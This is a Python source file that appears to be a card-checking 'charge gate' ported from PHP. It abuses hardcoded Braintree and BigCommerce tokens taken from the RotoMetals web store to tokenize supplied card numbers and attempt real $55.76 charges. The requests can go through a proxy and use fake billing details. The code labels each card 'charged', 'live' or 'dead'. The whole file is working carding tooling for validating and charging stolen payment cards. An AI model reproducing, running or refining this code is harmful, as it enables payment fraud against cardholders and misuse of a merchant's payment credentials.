
import random
import json
import aiohttp
import re

async def check_braintree_bigcommerce(card: str, month: str, year: str, cvv: str, proxy: str = None) -> dict:
    """Braintree Charge Gate (BigCommerce / Rotometals) - Ported from PHP"""
    
    # Pre-defined tokens from the PHP script
    BT_AUTH = "Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjczMjg4NzMsImp0aSI6IjcxNmQ3ZDFhLTUyMDgtNDkzNy04YTdkLWY0OGYzZDg0NWI4OCIsInN1YiI6Imh4ZGNmcDVoeWZmNmgzNzYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imh4ZGNmcDVoeWZmNmgzNzYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJhdWQiOlsicm90b21ldGFscy5jb20iLCJ3d3cucm90b21ldGFscy5jb20iXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJyb3RvbWV0YWxzaW5jX2luc3RhbnQiLCJwYXlwYWxfY2xpZW50X2lkIjoiQVZQVDYwNHV6VjEtM0o1MHNvUzVfYUtOWHliaDdmZEtCUHJFZk12QlJMS2MtbkxETjlINTI1bXF4cHFaSmd1R2pMUUREc0J1bW14UU9Bc1QifX0.MVV27c5bHYy-6PJ1Oo7S4uKqwuNPlpqXdaezIi5CwlzolgABxZYATBQ336jwTGOHjFXot4ZWldW8NDUhUTMdHA"
    BC_JWT = "JWT eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NjcyNDgyOTMsIm5iZiI6MTc2NzI0NDY5MywiaXNzIjoicGF5bWVudHMuYmlnY29tbWVyY2UuY29tIiwic3ViIjoxMDA2NTI4LCJqdGkiOiJiOWY5NjdmZS02NThlLTQ4ZGUtOTdiZC0wYjA5NzlhZDU5NDgiLCJpYXQiOjE3NjcyNDQ2OTMsImRhdGEiOnsic3RvcmVfaWQiOiIxMDA2NTI4Iiwib3JkZXJfaWQiOiIxODkxOTQiLCJhbW91bnQiOjU1NzYsImN1cnJlbmN5IjoiVVNEIiwic3RvcmVfdXJsIjoiaHR0cHM6Ly93d3cucm90b21ldGFscy5jb20iLCJmb3JtX2lkIjoidW5rbm93biIsInBheW1lbnRfY29udGV4dCI6ImNoZWNrb3V0IiwicGF5bWVudF90eXBlIjoiZWNvbW1lcmNlIn19.LQfiOMcFg41OwypueDC21-kSdAcY5G7xrH-HLqeGT78"
    
    # 1. Tokenize Card (Braintree GraphQL)
    try:
        async with aiohttp.ClientSession() as session:
            # Request 1: Tokenize
            url1 = "https://payments.braintree-api.com/graphql"
            headers1 = {
                "authority": "payments.braintree-api.com",
                "authorization": BT_AUTH,
                "braintree-version": "2018-05-10",
                "content-type": "application/json",
                "origin": "https://assets.braintreegateway.com",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
            }
            
            payload1 = {
                "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": "93c00f25-6747-4245-8000-e474c69c9b95"},
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": card,
                            "expirationMonth": month,
                            "expirationYear": year if len(year) == 4 else f"20{year}",
                            "cvv": cvv,
                            "billingAddress": {"countryName": "United States", "postalCode": "10080", "streetAddress": "Street 108"},
                            "cardholderName": "James Check"
                        },
                        "options": {"validate": False}
                    }
                },
                "operationName": "TokenizeCreditCard"
            }
            
            async with session.post(url1, json=payload1, headers=headers1, proxy=proxy, timeout=20) as resp1:
                res1 = await resp1.json()
                token = res1.get("data", {}).get("tokenizeCreditCard", {}).get("token")
                
                if not token:
                    return {"status": "error", "response": "Failed to tokenize card", "gate": "Braintree BigCommerce"}

            # Request 2: Charge (BigCommerce)
            url2 = "https://payments.bigcommerce.com/api/public/v1/orders/payments"
            headers2 = {
                "Authorization": BC_JWT,
                "Content-Type": "application/json",
                "Origin": "https://www.rotometals.com",
                "Referer": "https://www.rotometals.com/",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
            }
            
            payload2 = {
                "customer": {"geo_ip_country_code": "US", "session_token": "a0d9ef74fa622b6671c9be8164dc44b5ec72d111"},
                "notify_url": "https://internalapi-1006528.mybigcommerce.com/internalapi/v1/checkout/order/189194/payment",
                "order": {
                    "billing_address": {
                        "city": "New York", "country_code": "US", "first_name": "Fazil", "last_name": "Check", 
                        "zip": "10080", "email": "testcheck@gmail.com", "street_1": "Street 108", "state_code": "NY"
                    }, 
                    "id": "189194"
                },
                "payment": {
                    "device_info": "{\"correlation_id\":\"93c00f25-6747-4245-8000-e474c69c\"}",
                    "gateway": "braintree",
                    "notify_url": "https://internalapi-1006528.mybigcommerce.com/internalapi/v1/checkout/order/189194/payment",
                    "vault_payment_instrument": False,
                    "method": "credit-card",
                    "credit_card_token": {"token": token}
                },
                "store": {"hash": "cra054", "id": "1006528", "name": "RotoMetals"}
            }
            
            async with session.post(url2, json=payload2, headers=headers2, proxy=proxy, timeout=30) as resp2:
                # The response might be text or JSON. PHP used strpos check.
                text2 = await resp2.text()
                
                if '"result":"success"' in text2 or "Payment successful" in text2:
                    return {"status": "charged", "amount": "$55.76", "response": "$55.76 Charged (BigCommerce) 🔥", "gate": "Braintree BigCommerce"}
                
                # Error extraction logic from PHP: getStr($r2, '"errors":[{"code":"','","');
                # Usually {"status":"error","errors":[{"code":"gateway_error","message":"..."}]}
                
                import re
                try:
                    res_json2 = await resp2.json()
                    errors = res_json2.get("errors", [])
                    if errors:
                        msg = errors[0].get("message")
                        code = errors[0].get("code")
                        full_msg = f"{msg} ({code})"
                    else:
                        full_msg = "Declined"
                except:
                    # Fallback regex if JSON fails but structured like JSON in text
                    err_match = re.search(r'"message":"([^"]+)"', text2)
                    full_msg = err_match.group(1) if err_match else "Declined"

                if "insufficient" in full_msg.lower():
                    return {"status": "live", "response": "Insufficient Funds ✅", "gate": "Braintree BigCommerce"}
                
                if "risk" in full_msg.lower():
                    return {"status": "dead", "response": "Risk: Retry Later", "gate": "Braintree BigCommerce"}

                return {"status": "dead", "response": full_msg, "gate": "Braintree BigCommerce"}

    except Exception as e:
        return {"status": "error", "response": str(e), "gate": "Braintree BigCommerce"}
